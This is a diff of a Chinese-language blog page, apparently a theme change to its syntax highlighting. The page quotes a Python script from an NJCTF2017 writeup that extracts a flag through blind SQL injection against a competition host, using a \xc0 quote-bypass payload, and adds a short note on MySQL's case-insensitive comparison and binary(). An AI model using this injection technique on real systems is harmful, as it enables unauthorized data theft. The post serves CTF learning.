@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -478,7 +479,30 @@
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
         <p>在看NJCTF2017的writeup的时候看到了</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from urllib import quote</div><div class="line"></div><div class="line">url = "http://218.2.197.235:23733/index.php?key="</div><div class="line">payload = "\xc0'||(<span class="keyword">select</span>((flag))<span class="keyword">from</span>(flag))<span class="keyword">like</span>(<span class="number">0</span>x%s)#<span class="string">"</span></div><div class="line"><span class="string">def check(str):</span></div><div class="line"><span class="string">    u = url + quote(payload % (str.encode("</span><span class="keyword">hex</span><span class="string">")))</span></div><div class="line"><span class="string">    ret = requests.get(u).content</span></div><div class="line"><span class="string">    return '002265' in ret</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">ans = ""</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">s = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"</span>$\<span class="string">'()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\'"_%'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</div><div class="line">        print ans</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">            <span class="keyword">if</span> <span class="keyword">check</span>(ans + i + <span class="string">'%'</span>):</div><div class="line">                ans += i</div><div class="line">                break</div></pre></td></tr></table></figure>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> urllib <span class="token keyword">import</span> quote
+
+url <span class="token operator">=</span> "http:<span class="token comment" spellcheck="true">//218.2.197.235:23733/index.php?key="</span>
+payload <span class="token operator">=</span> "\xc0'<span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">like</span><span class="token punctuation">(</span>0x<span class="token operator">%</span>s<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#"</span>
+<span class="token number">def</span> <span class="token keyword">check</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>:
+    u <span class="token operator">=</span> url <span class="token operator">+</span> quote<span class="token punctuation">(</span>payload <span class="token operator">%</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    ret <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>content
+    <span class="token keyword">return</span> <span class="token string">'002265'</span> <span class="token operator">in</span> ret
+
+
+ans <span class="token operator">=</span> <span class="token string">""</span>
+
+s <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;&lt;=>?@[\\]^`{|}~\'"_%'</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">=</span><span class="token operator">=</span> <span class="token string">"__main__"</span>:
+    <span class="token keyword">while</span> <span class="token boolean">True</span>:
+        <span class="token keyword">print</span> ans
+        <span class="token keyword">for</span> i <span class="token operator">in</span> s:
+            <span class="token keyword">if</span> <span class="token keyword">check</span><span class="token punctuation">(</span>ans <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'%'</span><span class="token punctuation">)</span>:
+                ans <span class="token operator">+</span><span class="token operator">=</span> i
+                <span class="token keyword">break</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>其中， 这里<code>payload = &quot;\xc0&#39;||(select(binary(flag))from(flag))like(0x%s)#&quot;</code> 有一个<code>binary(flag)</code>, 查了下才知道原来<code>mysql</code>默认在查询的时候是不区分数据大小写的，需要加一个binary</p>
 
         
